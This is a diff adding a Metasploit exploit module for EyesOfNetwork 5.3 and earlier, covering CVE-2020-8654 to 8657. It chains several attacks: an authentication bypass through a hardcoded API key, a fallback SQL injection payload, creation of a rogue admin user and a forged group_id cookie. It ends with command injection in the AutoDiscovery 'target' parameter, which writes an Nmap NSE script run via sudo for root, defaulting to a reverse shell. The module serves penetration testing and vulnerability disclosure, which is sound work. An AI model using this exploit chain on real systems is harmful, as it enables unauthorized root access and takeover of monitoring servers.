@@ -1,0 +1,327 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'EyesOfNetwork AutoDiscovery Target Command Execution',
+      'Description'     => %q{
+        This module exploits multiple vulnerabilities in EyesOfNetwork version 5.3
+        and prior in order to execute arbitrary commands as root.
+
+        This module takes advantage of a command injection vulnerability in the
+        `target` parameter of the AutoDiscovery functionality within the EON web
+        interface in order to write an Nmap NSE script containing the payload to
+        disk. It then starts an Nmap scan to activate the payload. This results in
+        privilege escalation because the`apache` user can execute Nmap as root.
+
+        Valid credentials for a user with administrative privileges are required.
+        However, this module can bypass authentication via two methods, i.e. by
+        generating an API access token based on a hardcoded key, and via SQLI.
+        This module has been successfully tested on EyesOfNetwork 5.3 with API
+        version 2.4.2.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Clément Billac', # @h4knet - Discovery and exploit
+          'bcoles',         # Metasploit
+          'Erik Wynter'     # @wyntererik - Metasploit
+        ],
+      'References'      =>
+        [
+          ['CVE', '2020-8654'], # authenticated rce
+          ['CVE', '2020-8655'], # nmap privesc
+          ['CVE', '2020-8656'], # sqli auth bypass
+          ['CVE', '2020-8657'], # hardcoded API key
+          ['EDB', '48025']
+        ],
+      'Platform'        => %w[unix linux],
+      'Arch'            => ARCH_CMD,
+      'Targets'         => [['Auto', { }]],
+      'Privileged'      => true,
+      'DisclosureDate'  => '2020-02-06',
+      'DefaultOptions'  => {
+        'RPORT' => 443,
+        'SSL'     => true, #HTTPS is required for the module to work
+        'PAYLOAD' => 'generic/shell_reverse_tcp'
+        },
+      'DefaultTarget'   => 0))
+    register_options [
+      OptString.new('TARGETURI', [true, 'Base path to EyesOfNetwork', '/']),
+      OptString.new('SERVER_ADDR', [true, 'EyesOfNetwork server IP address (if different from RHOST)', '']),
+    ]
+    register_advanced_options [
+      OptBool.new('ForceExploit',  [false, 'Override check result', false])
+    ]
+  end
+
+  def nmap_path
+    '/usr/bin/nmap'
+  end
+
+  def server_addr
+    datastore['SERVER_ADDR'].blank? ? rhost : datastore['SERVER_ADDR']
+  end
+
+  def check
+    vprint_status("Running check")
+    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, '/eonapi/getApiKey')
+
+    unless res
+      return CheckCode::Unknown('Connection failed')
+    end
+
+    unless res.code == 401 && res.body.include?('api_version')
+      return CheckCode::Safe('Target is not an EyesOfNetwork application.')
+    end
+
+    version = res.get_json_document()['api_version'] rescue ''
+
+    if version.to_s.eql? ''
+      return CheckCode::Detected('Could not determine EyesOfNetwork version.')
+    end
+
+    version = Gem::Version.new version
+
+    unless version <= Gem::Version.new('2.4.2')
+      return CheckCode::Safe("Target is EyesOfNetwork with API version #{version}.")
+    end
+
+    CheckCode::Appears("Target is EyesOfNetwork with API version #{version}.")
+  end
+
+  def generate_api_key
+    default_key = "€On@piK3Y"
+    default_user_id = 1
+    key = Digest::MD5.hexdigest(default_key + default_user_id.to_s)
+    Digest::SHA256.hexdigest(key + server_addr)
+  end
+
+  def sqli_to_api_key
+    # Attempt to obtain the admin API key via SQL injection, using a fake password and its md5 encrypted hash
+    fake_pass = Rex::Text::rand_text_alpha(10)
+    fake_pass_md5 = Digest::MD5.hexdigest("#{fake_pass}")
+    user_sqli = "' union select 1,'admin','#{fake_pass_md5}',0,0,1,1,8 or '"
+    api_res = send_request_cgi({
+      'uri'       => normalize_uri(target_uri.path, "/eonapi/getApiKey"),
+      'method'    => 'GET',
+       'vars_get' => {
+        'username'   => user_sqli,
+        'password'   => fake_pass
+      }
+    })
+
+    unless api_res
+      print_error('Connection failed.')
+      return
+    end
+
+    unless api_res.code == 200 && api_res.get_json_document.include?('EONAPI_KEY')
+      print_error("SQL injection to obtain API key failed")
+      return
+    end
+
+    api_res.get_json_document()['EONAPI_KEY']
+  end
+
+  def create_eon_user(user, password)
+    vprint_status("Creating user #{user} ...")
+
+    vars_post = {
+      user_name:  user,
+      user_group: "admins",
+      user_password: password
+    }
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, '/eonapi/createEonUser'),
+      'ctype'    => 'application/json',
+      'vars_get' => {
+        'apiKey'   => @api_key,
+        'username' => @api_user
+      },
+      'data' => vars_post.to_json
+    })
+
+    unless res
+      print_warning("Failed to create user: Connection failed.")
+      return
+    end
+
+    return res
+  end
+
+  def verify_api_key(res)
+    return false unless res.code == 200
+
+    json_data = res.get_json_document
+    json_res = json_data['result']
+    return false unless json_res && json_res['description']
+    json_res = json_res['description']
+
+    return true if json_res && json_res.include?('SUCCESS')
+
+    return false
+  end
+
+  def delete_eon_user(user)
+    vprint_status "Removing user #{user} ..."
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, '/eonapi/deleteEonUser'),
+      'ctype'    => 'application/json',
+      'data'     => { user_name: user }.to_json,
+      'vars_get' => { apiKey: @api_key, username: @api_user }
+    })
+
+    unless res
+      print_warning 'Removing user #{user} failed: Connection failed'
+      return
+    end
+
+    res
+  end
+
+  def login(user, pass)
+    vprint_status "Authenticating as #{user} ..."
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'login.php'),
+      'vars_post' => {
+        login: user,
+        mdp: pass
+      }
+    })
+
+    unless res
+      fail_with Failure::Unreachable, 'Connection failed'
+    end
+
+    unless res.code == 200 && res.body.include?('dashboard_view')
+      fail_with Failure::NoAccess, 'Authentication failed'
+    end
+
+    print_good "Authenticated as user #{user}"
+
+    @cookie = res.get_cookies
+
+    if @cookie.empty?
+      fail_with Failure::UnexpectedReply, 'Failed to retrieve cookies'
+    end
+
+    res
+  end
+
+  def create_autodiscovery_job(cmd)
+    vprint_status "Creating AutoDiscovery job: #{cmd}"
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, '/lilac/autodiscovery.php'),
+      'cookie' => @cookie,
+      'vars_post' => {
+        'request'          => 'autodiscover',
+        'job_name'         => 'Internal discovery',
+        'job_description'  => 'Internal EON discovery procedure.',
+        'nmap_binary'      => nmap_path,
+        'default_template' => '',
+        'target[]'         => cmd
+      }
+    })
+
+    unless res
+      fail_with Failure::Unreachable, 'Creating AutoDiscovery job failed: Connection failed'
+    end
+
+    unless res.body.include? 'Starting...'
+      fail_with Failure::Unknown, 'Creating AutoDiscovery job failed: Job failed to start'
+    end
+
+    res
+  end
+
+  def delete_autodiscovery_job(job_id)
+    vprint_status "Removing AutoDiscovery job #{job_id} ..."
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, '/lilac/autodiscovery.php'),
+      'cookie' => @cookie,
+      'vars_get' => {
+        id: job_id,
+        delete: 1
+      }
+    })
+
+    unless res
+      print_warning "Removing AutoDiscovery job #{job_id} failed: Connection failed"
+      return
+    end
+    res
+  end
+
+  def execute_command(cmd, opts = {})
+    res = create_autodiscovery_job ";#{cmd} #"
+    return unless res
+
+    job_id = res.body.scan(/autodiscovery.php\?id=([\d]+)/).flatten.first
+
+    if job_id.empty?
+      print_warning 'Could not retrieve AutoDiscovery job ID. Manual removal required.'
+      return
+    end
+    delete_autodiscovery_job job_id
+  end
+
+  def cleanup
+    super
+    if @username
+      delete_eon_user @username
+    end
+  end
+
+  def exploit
+    unless [CheckCode::Detected, CheckCode::Appears].include? check
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    @api_user = 'admin'
+    @api_key = generate_api_key
+    print_status "Using generated API key: #{@api_key}"
+
+    @username = rand_text_alphanumeric(8..12)
+    @password = rand_text_alphanumeric(8..12)
+
+    create_res = create_eon_user @username, @password
+    unless verify_api_key(create_res)
+      @api_key = sqli_to_api_key
+      fail_with Failure::NoAccess, 'Failed to obtain valid API key' unless @api_key
+      print_status("Using API key obtained via SQL injection: #{@api_key}")
+      sqli_verify = create_eon_user @username, @password
+      fail_with Failure::NoAccess, 'Failed to obtain valid API with sqli' unless verify_api_key(sqli_verify)
+    end
+
+    admin_group_id = 1
+    login @username, @password
+    unless @cookie.include? 'group_id='
+      @cookie << "; group_id=#{admin_group_id}"
+    end
+
+    nse = Rex::Text.encode_base64("local os=require \"os\" hostrule=function(host) os.execute(\"#{payload.encoded.gsub(/"/, '\"')}\") end action=function() end")
+    nse_path = "/tmp/.#{rand_text_alphanumeric 8..12}"
+    cmd = "echo #{nse} | base64 -d > #{nse_path};sudo #{nmap_path} localhost -sn -script #{nse_path};rm #{nse_path}"
+    print_status "Sending payload (#{cmd.length} bytes) ..."
+    execute_command cmd
+  end
+end
